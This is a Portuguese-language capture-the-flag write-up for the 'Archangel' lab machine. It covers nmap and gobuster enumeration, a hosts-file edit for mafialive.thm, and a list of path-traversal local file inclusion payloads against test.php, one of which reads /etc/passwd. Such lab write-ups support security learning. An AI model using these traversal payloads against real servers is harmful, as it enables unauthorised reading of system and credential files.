# _**Archangel CTF**_
![](angel.jpg)

## _**Enumeração**_
Primeiro, vamos começar com um scan <mark>Nmap</mark>
> ```bash
> nmap -p 0-9999 -A -T5 [ip_address]
> ```
![](scan_nmap.jpg)

Vamos também realizar um scan com <mark>Gobuster</mark>
> ```bash
> gobuster dir --url [ip_address] -w ../Discovery/Web-Conten/common.txt
> ```
![](scan_gobuster.jpg)

Temos diversos diretórios para podermos explorar  
Vamos começar com <mark>/flags</mark>  
Temos um arquivo _.html_ que leva para a músca "never gonna give you up"  
Isso traz lembranças  

Vamos continuar  
Agora, o segundo diretório, <mark>/images</mark>  
Parece que temos apenas uma página em branco, sem nada no código da página também  
Se ficarmos sem pistas, tavlez novamente utilizar gobuster, mas neste diretório  

Os outros diretórios também estão vazios com páginas brancas  
Pareec que estamos ficando sem alternativas  
Muitos e muitos gobuster's depois, sem nenhum resultado diga-se de passagem, voltamos a página inicial  
Temos um nome de domínio, mas isso não nos diz muita coisa  
Após muito pesquisar, encontrei uma solução  
Deve-se adcionar o nome de domínio, isto é, _**mafialive.thm**_ para nosso arquivo _/etc/hosts_ e só assim, poderemos acessar a página verdadeira  
Vamos tentar  

![](etc_change.jpg)

Assim, conseguimos obter nossa primeira flag!  
Vamos continuar com novamente, um scan <mark>Nmap</mark>  

![](scan_nmap2.jpg)

Temos um resultado diferente!  
Agora é uma página _.php_  
E uma delas se chama _/test.php_  
> http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php

Parece que temos um lugar que aceita comandos  
Tentamos com ```id```, mas não é permitido  
Foram mais alguns comandos, mas nenhum deles foi permitido  
Vamos tentar os seguintes para LFI:
* ?view=../../../../../etc/passwd
* ?view=....//....//....//....//....//etc/passwd
* ?view=....\\/....\\/....\\/etc/passwd
* ?view=..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

Nenhum deles deu certo  
Sabemos que, ao clicar no botão, o _backend_ verifica o _path_  
Podemos tentar: 
* ?view=/var/www/html/development_testing/....//....//....//....//....//...//etc/passwd%00
* ?view=/var/www/html/development_testing/../../../../../etc/passwd%00
* ?view=/var/www/html/development_testing/....\\/....\\/....\\/....\\/....\\/....\\/etc/passwd%00
* ?view=/var/www/html/development_testing/..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

Também nenhum sucesso  
Após algumas várias tentativas, temos sucesso neste daqui: <mark>?view=/var/www/html/development_testing/..//..//..//..//..//..//etc/passwd</mark>  
Vamos puxar para nossa máquina e deixar _mais bonito_  

![](etc_passwd.jpg)

